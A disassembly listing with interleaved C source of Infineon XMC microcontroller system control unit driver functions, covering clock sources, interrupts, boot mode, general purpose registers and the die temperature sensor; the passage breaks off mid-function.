__STATIC_INLINE XMC_SCU_CLOCK_WDTCLKSRC_t XMC_SCU_CLOCK_GetWdtClockSource(void)
{
 8000d04:	b480      	push	{r7}
 8000d06:	af00      	add	r7, sp, #0
  return (XMC_SCU_CLOCK_WDTCLKSRC_t)(SCU_CLK->WDTCLKCR & SCU_CLK_WDTCLKCR_WDTSEL_Msk);
 8000d08:	4b04      	ldr	r3, [pc, #16]	; (8000d1c <XMC_SCU_CLOCK_GetWdtClockSource+0x18>)
 8000d0a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8000d0c:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
}
 8000d10:	4618      	mov	r0, r3
 8000d12:	46bd      	mov	sp, r7
 8000d14:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000d18:	4770      	bx	lr
 8000d1a:	bf00      	nop
 8000d1c:	50004600 	.word	0x50004600

08000d20 <XMC_SCU_CLOCK_GetExternalOutputClockSource>:
 * The value is obtained by reading \a ECKSEL bits of \a EXTCLKCR register.
 * \par<b>Related APIs:</b><BR>
 * XMC_SCU_CLOCK_SetExternalOutputClockSource(), XMC_SCU_CLOCK_SetExternalOutputClockDivider() \n\n\n
 */
__STATIC_INLINE XMC_SCU_CLOCK_EXTOUTCLKSRC_t XMC_SCU_CLOCK_GetExternalOutputClockSource(void)
{
 8000d20:	b480      	push	{r7}
 8000d22:	af00      	add	r7, sp, #0
  return (XMC_SCU_CLOCK_EXTOUTCLKSRC_t)(SCU_CLK->EXTCLKCR & SCU_CLK_EXTCLKCR_ECKSEL_Msk);
 8000d24:	4b05      	ldr	r3, [pc, #20]	; (8000d3c <XMC_SCU_CLOCK_GetExternalOutputClockSource+0x1c>)
 8000d26:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8000d28:	b2db      	uxtb	r3, r3
 8000d2a:	f003 0303 	and.w	r3, r3, #3
 8000d2e:	b2db      	uxtb	r3, r3
}
 8000d30:	4618      	mov	r0, r3
 8000d32:	46bd      	mov	sp, r7
 8000d34:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000d38:	4770      	bx	lr
 8000d3a:	bf00      	nop
 8000d3c:	50004600 	.word	0x50004600

08000d40 <XMC_SCU_CLOCK_GetSystemClockFrequency>:
 * fSYS = fCPU << CPUDIV.
 * \par<b>Related APIs:</b><BR>
 * XMC_SCU_CLOCK_GetUsbPllClockFrequency() \n\n\n
 */
__STATIC_INLINE uint32_t XMC_SCU_CLOCK_GetSystemClockFrequency(void)
{
 8000d40:	b480      	push	{r7}
 8000d42:	af00      	add	r7, sp, #0
  return SystemCoreClock << ((SCU_CLK->CPUCLKCR & SCU_CLK_CPUCLKCR_CPUDIV_Msk) >> SCU_CLK_CPUCLKCR_CPUDIV_Pos);
 8000d44:	4b06      	ldr	r3, [pc, #24]	; (8000d60 <XMC_SCU_CLOCK_GetSystemClockFrequency+0x20>)
 8000d46:	681a      	ldr	r2, [r3, #0]
 8000d48:	4b06      	ldr	r3, [pc, #24]	; (8000d64 <XMC_SCU_CLOCK_GetSystemClockFrequency+0x24>)
 8000d4a:	691b      	ldr	r3, [r3, #16]
 8000d4c:	f003 0301 	and.w	r3, r3, #1
 8000d50:	fa02 f303 	lsl.w	r3, r2, r3
}
 8000d54:	4618      	mov	r0, r3
 8000d56:	46bd      	mov	sp, r7
 8000d58:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000d5c:	4770      	bx	lr
 8000d5e:	bf00      	nop
 8000d60:	2000ffc0 	.word	0x2000ffc0
 8000d64:	50004600 	.word	0x50004600

08000d68 <XMC_SCU_CLOCK_GetCpuClockFrequency>:
 *
 * \par<b>Related APIs:</b><BR>
 * XMC_SCU_CLOCK_GetPeripheralClockFrequency(), XMC_SCU_CLOCK_GatePeripheralClock() \n\n\n
 */
__STATIC_INLINE uint32_t XMC_SCU_CLOCK_GetCpuClockFrequency(void)
{
 8000d68:	b480      	push	{r7}
 8000d6a:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 8000d6c:	4b03      	ldr	r3, [pc, #12]	; (8000d7c <XMC_SCU_CLOCK_GetCpuClockFrequency+0x14>)
 8000d6e:	681b      	ldr	r3, [r3, #0]
}
 8000d70:	4618      	mov	r0, r3
 8000d72:	46bd      	mov	sp, r7
 8000d74:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000d78:	4770      	bx	lr
 8000d7a:	bf00      	nop
 8000d7c:	2000ffc0 	.word	0x2000ffc0

08000d80 <XMC_SCU_GetMirrorStatus>:
 * that a corresponding register of the hibernate domain is ready to accept a write or that the communication interface
 * is busy with executing the previous operation.\n
 * Note: There is no hibernate domain in XMC1x devices. This register is retained for legacy purpose.
 */
__STATIC_INLINE uint32_t XMC_SCU_GetMirrorStatus(void)
{
 8000d80:	b480      	push	{r7}
 8000d82:	af00      	add	r7, sp, #0
  return(SCU_GENERAL->MIRRSTS);
 8000d84:	4b03      	ldr	r3, [pc, #12]	; (8000d94 <XMC_SCU_GetMirrorStatus+0x14>)
 8000d86:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
}
 8000d8a:	4618      	mov	r0, r3
 8000d8c:	46bd      	mov	sp, r7
 8000d8e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000d92:	4770      	bx	lr
 8000d94:	50004000 	.word	0x50004000

08000d98 <XMC_SCU_lDelay>:
/*********************************************************************************************************************
 * API IMPLEMENTATION
 ********************************************************************************************************************/
/* This is a local function used to generate the delay until register get updated with new configured value.  */
void XMC_SCU_lDelay(uint32_t delay)
{
 8000d98:	b580      	push	{r7, lr}
 8000d9a:	b084      	sub	sp, #16
 8000d9c:	af00      	add	r7, sp, #0
 8000d9e:	6078      	str	r0, [r7, #4]
  uint32_t i;

  SystemCoreClockUpdate();
 8000da0:	f005 fbb8 	bl	8006514 <SystemCoreClockUpdate>
  delay =  delay * (uint32_t)(SystemCoreClock / FREQ_1MHZ);
 8000da4:	4b0c      	ldr	r3, [pc, #48]	; (8000dd8 <XMC_SCU_lDelay+0x40>)
 8000da6:	681b      	ldr	r3, [r3, #0]
 8000da8:	4a0c      	ldr	r2, [pc, #48]	; (8000ddc <XMC_SCU_lDelay+0x44>)
 8000daa:	fba2 2303 	umull	r2, r3, r2, r3
 8000dae:	0c9a      	lsrs	r2, r3, #18
 8000db0:	687b      	ldr	r3, [r7, #4]
 8000db2:	fb02 f303 	mul.w	r3, r2, r3
 8000db6:	607b      	str	r3, [r7, #4]

  for (i = 0U; i < delay; ++i)
 8000db8:	2300      	movs	r3, #0
 8000dba:	60fb      	str	r3, [r7, #12]
 8000dbc:	e003      	b.n	8000dc6 <XMC_SCU_lDelay+0x2e>
  {
    __NOP();
 8000dbe:	bf00      	nop
  for (i = 0U; i < delay; ++i)
 8000dc0:	68fb      	ldr	r3, [r7, #12]
 8000dc2:	3301      	adds	r3, #1
 8000dc4:	60fb      	str	r3, [r7, #12]
 8000dc6:	68fa      	ldr	r2, [r7, #12]
 8000dc8:	687b      	ldr	r3, [r7, #4]
 8000dca:	429a      	cmp	r2, r3
 8000dcc:	d3f7      	bcc.n	8000dbe <XMC_SCU_lDelay+0x26>
  }
}
 8000dce:	bf00      	nop
 8000dd0:	bf00      	nop
 8000dd2:	3710      	adds	r7, #16
 8000dd4:	46bd      	mov	sp, r7
 8000dd6:	bd80      	pop	{r7, pc}
 8000dd8:	2000ffc0 	.word	0x2000ffc0
 8000ddc:	431bde83 	.word	0x431bde83

08000de0 <XMC_SCU_INTERRUPT_EnableEvent>:

/* API to enable the SCU event */
void XMC_SCU_INTERRUPT_EnableEvent(const XMC_SCU_INTERRUPT_EVENT_t event)
{
 8000de0:	b480      	push	{r7}
 8000de2:	b083      	sub	sp, #12
 8000de4:	af00      	add	r7, sp, #0
 8000de6:	6078      	str	r0, [r7, #4]
  SCU_INTERRUPT->SRMSK |= (uint32_t)event;
 8000de8:	4b05      	ldr	r3, [pc, #20]	; (8000e00 <XMC_SCU_INTERRUPT_EnableEvent+0x20>)
 8000dea:	689a      	ldr	r2, [r3, #8]
 8000dec:	4904      	ldr	r1, [pc, #16]	; (8000e00 <XMC_SCU_INTERRUPT_EnableEvent+0x20>)
 8000dee:	687b      	ldr	r3, [r7, #4]
 8000df0:	4313      	orrs	r3, r2
 8000df2:	608b      	str	r3, [r1, #8]
}
 8000df4:	bf00      	nop
 8000df6:	370c      	adds	r7, #12
 8000df8:	46bd      	mov	sp, r7
 8000dfa:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000dfe:	4770      	bx	lr
 8000e00:	50004074 	.word	0x50004074

08000e04 <XMC_SCU_INTERRUPT_DisableEvent>:

/* API to disable the SCU event */
void XMC_SCU_INTERRUPT_DisableEvent(const XMC_SCU_INTERRUPT_EVENT_t event)
{
 8000e04:	b480      	push	{r7}
 8000e06:	b083      	sub	sp, #12
 8000e08:	af00      	add	r7, sp, #0
 8000e0a:	6078      	str	r0, [r7, #4]
  SCU_INTERRUPT->SRMSK &= (uint32_t)~event;
 8000e0c:	4b06      	ldr	r3, [pc, #24]	; (8000e28 <XMC_SCU_INTERRUPT_DisableEvent+0x24>)
 8000e0e:	689a      	ldr	r2, [r3, #8]
 8000e10:	687b      	ldr	r3, [r7, #4]
 8000e12:	43db      	mvns	r3, r3
 8000e14:	4904      	ldr	r1, [pc, #16]	; (8000e28 <XMC_SCU_INTERRUPT_DisableEvent+0x24>)
 8000e16:	4013      	ands	r3, r2
 8000e18:	608b      	str	r3, [r1, #8]
}
 8000e1a:	bf00      	nop
 8000e1c:	370c      	adds	r7, #12
 8000e1e:	46bd      	mov	sp, r7
 8000e20:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e24:	4770      	bx	lr
 8000e26:	bf00      	nop
 8000e28:	50004074 	.word	0x50004074

08000e2c <XMC_SCU_INTERRUPT_TriggerEvent>:

/* API to trigger the SCU event */
void XMC_SCU_INTERRUPT_TriggerEvent(const XMC_SCU_INTERRUPT_EVENT_t event)
{
 8000e2c:	b480      	push	{r7}
 8000e2e:	b083      	sub	sp, #12
 8000e30:	af00      	add	r7, sp, #0
 8000e32:	6078      	str	r0, [r7, #4]
  SCU_INTERRUPT->SRSET |= (uint32_t)event;
 8000e34:	4b05      	ldr	r3, [pc, #20]	; (8000e4c <XMC_SCU_INTERRUPT_TriggerEvent+0x20>)
 8000e36:	691a      	ldr	r2, [r3, #16]
 8000e38:	4904      	ldr	r1, [pc, #16]	; (8000e4c <XMC_SCU_INTERRUPT_TriggerEvent+0x20>)
 8000e3a:	687b      	ldr	r3, [r7, #4]
 8000e3c:	4313      	orrs	r3, r2
 8000e3e:	610b      	str	r3, [r1, #16]
}
 8000e40:	bf00      	nop
 8000e42:	370c      	adds	r7, #12
 8000e44:	46bd      	mov	sp, r7
 8000e46:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e4a:	4770      	bx	lr
 8000e4c:	50004074 	.word	0x50004074

08000e50 <XMC_SCU_INTERUPT_GetEventStatus>:

/* API to retrieve the SCU event status */
XMC_SCU_INTERRUPT_EVENT_t XMC_SCU_INTERUPT_GetEventStatus(void)
{
 8000e50:	b480      	push	{r7}
 8000e52:	af00      	add	r7, sp, #0
  return (SCU_INTERRUPT->SRRAW);
 8000e54:	4b03      	ldr	r3, [pc, #12]	; (8000e64 <XMC_SCU_INTERUPT_GetEventStatus+0x14>)
 8000e56:	685b      	ldr	r3, [r3, #4]
}
 8000e58:	4618      	mov	r0, r3
 8000e5a:	46bd      	mov	sp, r7
 8000e5c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e60:	4770      	bx	lr
 8000e62:	bf00      	nop
 8000e64:	50004074 	.word	0x50004074

08000e68 <XMC_SCU_INTERRUPT_ClearEventStatus>:

/* API to clear the SCU event status */
void XMC_SCU_INTERRUPT_ClearEventStatus(const XMC_SCU_INTERRUPT_EVENT_t event)
{
 8000e68:	b480      	push	{r7}
 8000e6a:	b083      	sub	sp, #12
 8000e6c:	af00      	add	r7, sp, #0
 8000e6e:	6078      	str	r0, [r7, #4]
  SCU_INTERRUPT->SRCLR = (uint32_t)event;
 8000e70:	4a04      	ldr	r2, [pc, #16]	; (8000e84 <XMC_SCU_INTERRUPT_ClearEventStatus+0x1c>)
 8000e72:	687b      	ldr	r3, [r7, #4]
 8000e74:	60d3      	str	r3, [r2, #12]
}
 8000e76:	bf00      	nop
 8000e78:	370c      	adds	r7, #12
 8000e7a:	46bd      	mov	sp, r7
 8000e7c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e80:	4770      	bx	lr
 8000e82:	bf00      	nop
 8000e84:	50004074 	.word	0x50004074

08000e88 <XMC_SCU_GetBootMode>:


/* API to retrieve the currently deployed device bootmode */
uint32_t XMC_SCU_GetBootMode(void)
{
 8000e88:	b480      	push	{r7}
 8000e8a:	af00      	add	r7, sp, #0
  return (uint32_t)(SCU_GENERAL->STCON & SCU_GENERAL_STCON_SWCON_Msk);
 8000e8c:	4b04      	ldr	r3, [pc, #16]	; (8000ea0 <XMC_SCU_GetBootMode+0x18>)
 8000e8e:	691b      	ldr	r3, [r3, #16]
 8000e90:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
}
 8000e94:	4618      	mov	r0, r3
 8000e96:	46bd      	mov	sp, r7
 8000e98:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e9c:	4770      	bx	lr
 8000e9e:	bf00      	nop
 8000ea0:	50004000 	.word	0x50004000

08000ea4 <XMC_SCU_SetBootMode>:

/* API to program a new device bootmode */
void XMC_SCU_SetBootMode(const XMC_SCU_BOOTMODE_t bootmode)
{
 8000ea4:	b480      	push	{r7}
 8000ea6:	b083      	sub	sp, #12
 8000ea8:	af00      	add	r7, sp, #0
 8000eaa:	4603      	mov	r3, r0
 8000eac:	80fb      	strh	r3, [r7, #6]
  SCU_GENERAL->STCON = (uint32_t)bootmode;
 8000eae:	4a04      	ldr	r2, [pc, #16]	; (8000ec0 <XMC_SCU_SetBootMode+0x1c>)
 8000eb0:	88fb      	ldrh	r3, [r7, #6]
 8000eb2:	6113      	str	r3, [r2, #16]
}
 8000eb4:	bf00      	nop
 8000eb6:	370c      	adds	r7, #12
 8000eb8:	46bd      	mov	sp, r7
 8000eba:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000ebe:	4770      	bx	lr
 8000ec0:	50004000 	.word	0x50004000

08000ec4 <XMC_SCU_ReadGPR>:

/* API to read from General purpose register */
uint32_t XMC_SCU_ReadGPR(const uint32_t index)
{
 8000ec4:	b480      	push	{r7}
 8000ec6:	b083      	sub	sp, #12
 8000ec8:	af00      	add	r7, sp, #0
 8000eca:	6078      	str	r0, [r7, #4]
  return (SCU_GENERAL->GPR[index]);
 8000ecc:	4a05      	ldr	r2, [pc, #20]	; (8000ee4 <XMC_SCU_ReadGPR+0x20>)
 8000ece:	687b      	ldr	r3, [r7, #4]
 8000ed0:	330a      	adds	r3, #10
 8000ed2:	009b      	lsls	r3, r3, #2
 8000ed4:	4413      	add	r3, r2
 8000ed6:	685b      	ldr	r3, [r3, #4]
}
 8000ed8:	4618      	mov	r0, r3
 8000eda:	370c      	adds	r7, #12
 8000edc:	46bd      	mov	sp, r7
 8000ede:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000ee2:	4770      	bx	lr
 8000ee4:	50004000 	.word	0x50004000

08000ee8 <XMC_SCU_WriteGPR>:

/* API to write to GPR */
void XMC_SCU_WriteGPR(const uint32_t index, const uint32_t data)
{
 8000ee8:	b480      	push	{r7}
 8000eea:	b083      	sub	sp, #12
 8000eec:	af00      	add	r7, sp, #0
 8000eee:	6078      	str	r0, [r7, #4]
 8000ef0:	6039      	str	r1, [r7, #0]
  SCU_GENERAL->GPR[index] = data;
 8000ef2:	4a06      	ldr	r2, [pc, #24]	; (8000f0c <XMC_SCU_WriteGPR+0x24>)
 8000ef4:	687b      	ldr	r3, [r7, #4]
 8000ef6:	330a      	adds	r3, #10
 8000ef8:	009b      	lsls	r3, r3, #2
 8000efa:	4413      	add	r3, r2
 8000efc:	683a      	ldr	r2, [r7, #0]
 8000efe:	605a      	str	r2, [r3, #4]
}
 8000f00:	bf00      	nop
 8000f02:	370c      	adds	r7, #12
 8000f04:	46bd      	mov	sp, r7
 8000f06:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000f0a:	4770      	bx	lr
 8000f0c:	50004000 	.word	0x50004000

08000f10 <XMC_SCU_EnableOutOfRangeComparator>:

/* API to enable Out of Range Comparator(ORC) for a desired group and a desired channel input */
void XMC_SCU_EnableOutOfRangeComparator(const uint32_t group, const uint32_t channel)
{
 8000f10:	b480      	push	{r7}
 8000f12:	b083      	sub	sp, #12
 8000f14:	af00      	add	r7, sp, #0
 8000f16:	6078      	str	r0, [r7, #4]
 8000f18:	6039      	str	r1, [r7, #0]
  XMC_ASSERT("XMC_SCU_EnableOutOfangeComparator:Wrong Group Number",XMC_SCU_CHECK_GRPNUM(group));
  XMC_ASSERT("XMC_SCU_EnableOutOfangeComparator:Wrong Channel Number",XMC_SCU_CHECK_CHNUM(channel));
   
  SCU_GENERAL->GORCEN[group] |= (uint32_t)(1UL << channel);
 8000f1a:	4a0a      	ldr	r2, [pc, #40]	; (8000f44 <XMC_SCU_EnableOutOfRangeComparator+0x34>)
 8000f1c:	687b      	ldr	r3, [r7, #4]
 8000f1e:	3328      	adds	r3, #40	; 0x28
 8000f20:	f852 2023 	ldr.w	r2, [r2, r3, lsl #2]
 8000f24:	2101      	movs	r1, #1
 8000f26:	683b      	ldr	r3, [r7, #0]
 8000f28:	fa01 f303 	lsl.w	r3, r1, r3
 8000f2c:	4905      	ldr	r1, [pc, #20]	; (8000f44 <XMC_SCU_EnableOutOfRangeComparator+0x34>)
 8000f2e:	431a      	orrs	r2, r3
 8000f30:	687b      	ldr	r3, [r7, #4]
 8000f32:	3328      	adds	r3, #40	; 0x28
 8000f34:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
}
 8000f38:	bf00      	nop
 8000f3a:	370c      	adds	r7, #12
 8000f3c:	46bd      	mov	sp, r7
 8000f3e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000f42:	4770      	bx	lr
 8000f44:	50004000 	.word	0x50004000

08000f48 <XMC_SCU_DisableOutOfRangeComparator>:

/* API to enable Out of Range Comparator(ORC) for a desired group and a desired channel input */
void XMC_SCU_DisableOutOfRangeComparator(const uint32_t group, const uint32_t channel)
{
 8000f48:	b480      	push	{r7}
 8000f4a:	b083      	sub	sp, #12
 8000f4c:	af00      	add	r7, sp, #0
 8000f4e:	6078      	str	r0, [r7, #4]
 8000f50:	6039      	str	r1, [r7, #0]
  XMC_ASSERT("XMC_SCU_DisableOutOfRangeComparator:Wrong Group Number",XMC_SCU_CHECK_GRPNUM(group));
  XMC_ASSERT("XMC_SCU_DisableOutOfRangeComparator:Wrong Channel Number",XMC_SCU_CHECK_CHNUM(channel));
   
  SCU_GENERAL->GORCEN[group] &= (uint32_t)~(1UL << channel);
 8000f52:	4a0b      	ldr	r2, [pc, #44]	; (8000f80 <XMC_SCU_DisableOutOfRangeComparator+0x38>)
 8000f54:	687b      	ldr	r3, [r7, #4]
 8000f56:	3328      	adds	r3, #40	; 0x28
 8000f58:	f852 2023 	ldr.w	r2, [r2, r3, lsl #2]
 8000f5c:	2101      	movs	r1, #1
 8000f5e:	683b      	ldr	r3, [r7, #0]
 8000f60:	fa01 f303 	lsl.w	r3, r1, r3
 8000f64:	43db      	mvns	r3, r3
 8000f66:	4906      	ldr	r1, [pc, #24]	; (8000f80 <XMC_SCU_DisableOutOfRangeComparator+0x38>)
 8000f68:	401a      	ands	r2, r3
 8000f6a:	687b      	ldr	r3, [r7, #4]
 8000f6c:	3328      	adds	r3, #40	; 0x28
 8000f6e:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
}
 8000f72:	bf00      	nop
 8000f74:	370c      	adds	r7, #12
 8000f76:	46bd      	mov	sp, r7
 8000f78:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000f7c:	4770      	bx	lr
 8000f7e:	bf00      	nop
 8000f80:	50004000 	.word	0x50004000

08000f84 <XMC_SCU_CalibrateTemperatureSensor>:

/* API to calibrate temperature sensor */
void XMC_SCU_CalibrateTemperatureSensor(uint32_t offset, uint32_t gain)
{
 8000f84:	b480      	push	{r7}
 8000f86:	b083      	sub	sp, #12
 8000f88:	af00      	add	r7, sp, #0
 8000f8a:	6078      	str	r0, [r7, #4]
 8000f8c:	6039      	str	r1, [r7, #0]
  SCU_GENERAL->DTSCON = ((uint32_t)(offset << SCU_GENERAL_DTSCON_OFFSET_Pos) |
 8000f8e:	687b      	ldr	r3, [r7, #4]
 8000f90:	011a      	lsls	r2, r3, #4
                        (uint32_t)(gain << SCU_GENERAL_DTSCON_GAIN_Pos) |
 8000f92:	683b      	ldr	r3, [r7, #0]
 8000f94:	02db      	lsls	r3, r3, #11
  SCU_GENERAL->DTSCON = ((uint32_t)(offset << SCU_GENERAL_DTSCON_OFFSET_Pos) |
 8000f96:	4313      	orrs	r3, r2
 8000f98:	4a05      	ldr	r2, [pc, #20]	; (8000fb0 <XMC_SCU_CalibrateTemperatureSensor+0x2c>)
                        (uint32_t)(0x4UL << SCU_GENERAL_DTSCON_REFTRIM_Pos) |
 8000f9a:	f443 0308 	orr.w	r3, r3, #8912896	; 0x880000
  SCU_GENERAL->DTSCON = ((uint32_t)(offset << SCU_GENERAL_DTSCON_OFFSET_Pos) |
 8000f9e:	f8c2 308c 	str.w	r3, [r2, #140]	; 0x8c
                        (uint32_t)(0x8UL << SCU_GENERAL_DTSCON_BGTRIM_Pos));
}
 8000fa2:	bf00      	nop
 8000fa4:	370c      	adds	r7, #12
 8000fa6:	46bd      	mov	sp, r7
 8000fa8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000fac:	4770      	bx	lr
 8000fae:	bf00      	nop
 8000fb0:	50004000 	.word	0x50004000

08000fb4 <XMC_SCU_EnableTemperatureSensor>:
/* API to enable die temperature measurement by powering the DTS module. */
void XMC_SCU_EnableTemperatureSensor(void)
{
 8000fb4:	b480      	push	{r7}
 8000fb6:	af00      	add	r7, sp, #0
  SCU_GENERAL->DTSCON &= (uint32_t)~(SCU_GENERAL_DTSCON_PWD_Msk);
 8000fb8:	4b06      	ldr	r3, [pc, #24]	; (8000fd4 <XMC_SCU_EnableTemperatureSensor+0x20>)
 8000fba:	f8d3 308c 	ldr.w	r3, [r3, #140]	; 0x8c
 8000fbe:	4a05      	ldr	r2, [pc, #20]	; (8000fd4 <XMC_SCU_EnableTemperatureSensor+0x20>)
 8000fc0:	f023 0301 	bic.w	r3, r3, #1
 8000fc4:	f8c2 308c 	str.w	r3, [r2, #140]	; 0x8c
}
 8000fc8:	bf00      	nop
 8000fca:	46bd      	mov	sp, r7
 8000fcc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000fd0:	4770      	bx	lr
 8000fd2:	bf00      	nop
 8000fd4:	50004000 	.word	0x50004000

08000fd8 <XMC_SCU_DisableTemperatureSensor>:

/* API to disable die temperature measurement by powering the DTS module off. */
void XMC_SCU_DisableTemperatureSensor(void)
{
 8000fd8:	b480      	push	{r7}
 8000fda:	af00      	add	r7, sp, #0
  SCU_GENERAL->DTSCON |= (uint32_t)SCU_GENERAL_DTSCON_PWD_Msk;
 8000fdc:	4b06      	ldr	r3, [pc, #24]	; (8000ff8 <XMC_SCU_DisableTemperatureSensor+0x20>)
 8000fde:	f8d3 308c 	ldr.w	r3, [r3, #140]	; 0x8c
 8000fe2:	4a05      	ldr	r2, [pc, #20]	; (8000ff8 <XMC_SCU_DisableTemperatureSensor+0x20>)
 8000fe4:	f043 0301 	orr.w	r3, r3, #1
 8000fe8:	f8c2 308c 	str.w	r3, [r2, #140]	; 0x8c
}
 8000fec:	bf00      	nop
 8000fee:	46bd      	mov	sp, r7
 8000ff0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000ff4:	4770      	bx	lr
 8000ff6:	bf00      	nop
 8000ff8:	50004000 	.word	0x50004000

08000ffc <XMC_SCU_IsTemperatureSensorEnabled>:

/* API to provide the die temperature sensor power status. */
bool XMC_SCU_IsTemperatureSensorEnabled(void)
{
 8000ffc:	b480      	push	{r7}
 8000ffe:	af00      	add	r7, sp, #0
  return ((SCU_GENERAL->DTSCON & SCU_GENERAL_DTSCON_PWD_Msk) == 0U);
 8001000:	4b07      	ldr	r3, [pc, #28]	; (8001020 <XMC_SCU_IsTemperatureSensorEnabled+0x24>)
 8001002:	f8d3 308c 	ldr.w	r3, [r3, #140]	; 0x8c
 8001006:	f003 0301 	and.w	r3, r3, #1
 800100a:	2b00      	cmp	r3, #0
 800100c:	bf0c      	ite	eq
 800100e:	2301      	moveq	r3, #1
 8001010:	2300      	movne	r3, #0
 8001012:	b2db      	uxtb	r3, r3
}
 8001014:	4618      	mov	r0, r3
 8001016:	46bd      	mov	sp, r7
 8001018:	f85d 7b04 	ldr.w	r7, [sp], #4
 800101c:	4770      	bx	lr
 800101e:	bf00      	nop
 8001020:	50004000 	.word	0x50004000

08001024 <XMC_SCU_IsTemperatureSensorReady>:

/* API to check if the die temperature sensor is ready to start a measurement. */
bool XMC_SCU_IsTemperatureSensorReady(void)
{
 8001024:	b480      	push	{r7}
 8001026:	af00      	add	r7, sp, #0
  return ((SCU_GENERAL->DTSSTAT & SCU_GENERAL_DTSSTAT_RDY_Msk) != 0U);
 8001028:	4b07      	ldr	r3, [pc, #28]	; (8001048 <XMC_SCU_IsTemperatureSensorReady+0x24>)
 800102a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800102e:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8001032:	2b00      	cmp	r3, #0
 8001034:	bf14      	ite	ne
 8001036:	2301      	movne	r3, #1
 8001038:	2300      	moveq	r3, #0
 800103a:	b2db      	uxtb	r3, r3
}
 800103c:	4618      	mov	r0, r3
 800103e:	46bd      	mov	sp, r7
 8001040:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001044:	4770      	bx	lr
 8001046:	bf00      	nop
 8001048:	50004000 	.word	0x50004000

0800104c <XMC_SCU_StartTemperatureMeasurement>:
/* API to start device temperature measurements */
XMC_SCU_STATUS_t XMC_SCU_StartTemperatureMeasurement(void)
{
 800104c:	b580      	push	{r7, lr}
 800104e:	b082      	sub	sp, #8
 8001050:	af00      	add	r7, sp, #0
  XMC_SCU_STATUS_t status = XMC_SCU_STATUS_OK;
 8001052:	2300      	movs	r3, #0
 8001054:	71fb      	strb	r3, [r7, #7]

  if (XMC_SCU_IsTemperatureSensorEnabled() == false)
 8001056:	f7ff ffd1 	bl	8000ffc <XMC_SCU_IsTemperatureSensorEnabled>
 800105a:	4603      	mov	r3, r0
 800105c:	f083 0301 	eor.w	r3, r3, #1
 8001060:	b2db      	uxtb	r3, r3
 8001062:	2b00      	cmp	r3, #0
 8001064:	d001      	beq.n	800106a <XMC_SCU_StartTemperatureMeasurement+0x1e>
  {
    status = XMC_SCU_STATUS_ERROR;
 8001066:	2301      	movs	r3, #1
 8001068:	71fb      	strb	r3, [r7, #7]
  }
   
  if (XMC_SCU_IsTemperatureSensorBusy() == true)
 800106a:	f000 f831 	bl	80010d0 <XMC_SCU_IsTemperatureSensorBusy>
 800106e:	4603      	mov	r3, r0
 8001070:	2b00      	cmp	r3, #0
 8001072:	d001      	beq.n	8001078 <XMC_SCU_StartTemperatureMeasurement+0x2c>
  {
    status = XMC_SCU_STATUS_BUSY;
 8001074:	2302      	movs	r3, #2
 8001076:	71fb      	strb	r3, [r7, #7]
  }

  /* And start the measurement */
  SCU_GENERAL->DTSCON |= (uint32_t)SCU_GENERAL_DTSCON_START_Msk;
 8001078:	4b06      	ldr	r3, [pc, #24]	; (8001094 <XMC_SCU_StartTemperatureMeasurement+0x48>)
 800107a:	f8d3 308c 	ldr.w	r3, [r3, #140]	; 0x8c
 800107e:	4a05      	ldr	r2, [pc, #20]	; (8001094 <XMC_SCU_StartTemperatureMeasurement+0x48>)
 8001080:	f043 0302 	orr.w	r3, r3, #2
 8001084:	f8c2 308c 	str.w	r3, [r2, #140]	; 0x8c
  
  return (status);
 8001088:	79fb      	ldrb	r3, [r7, #7]
}
 800108a:	4618      	mov	r0, r3
 800108c:	3708      	adds	r7, #8
 800108e:	46bd      	mov	sp, r7
 8001090:	bd80      	pop	{r7, pc}
 8001092:	bf00      	nop
 8001094:	50004000 	.word	0x50004000

08001098 <XMC_SCU_GetTemperatureMeasurement>:

/* API to retrieve the temperature measured */
uint32_t XMC_SCU_GetTemperatureMeasurement(void)
{
 8001098:	b580      	push	{r7, lr}
 800109a:	b082      	sub	sp, #8
 800109c:	af00      	add	r7, sp, #0
  uint32_t temperature;

  if (XMC_SCU_IsTemperatureSensorEnabled() == false)
 800109e:	f7ff ffad 	bl	8000ffc <XMC_SCU_IsTemperatureSensorEnabled>
 80010a2:	4603      	mov	r3, r0
 80010a4:	f083 0301 	eor.w	r3, r3, #1
 80010a8:	b2db      	uxtb	r3, r3
 80010aa:	2b00      	cmp	r3, #0
 80010ac:	d003      	beq.n	80010b6 <XMC_SCU_GetTemperatureMeasurement+0x1e>
  {
    temperature = 0x7FFFFFFFUL;
 80010ae:	f06f 4300 	mvn.w	r3, #2147483648	; 0x80000000
 80010b2:	607b      	str	r3, [r7, #4]
 80010b4:	e005      	b.n	80010c2 <XMC_SCU_GetTemperatureMeasurement+0x2a>
  }
  else
  {
    temperature = (uint32_t)((SCU_GENERAL->DTSSTAT & SCU_GENERAL_DTSSTAT_RESULT_Msk) >> SCU_GENERAL_DTSSTAT_RESULT_Pos);
 80010b6:	4b05      	ldr	r3, [pc, #20]	; (80010cc <XMC_SCU_GetTemperatureMeasurement+0x34>)
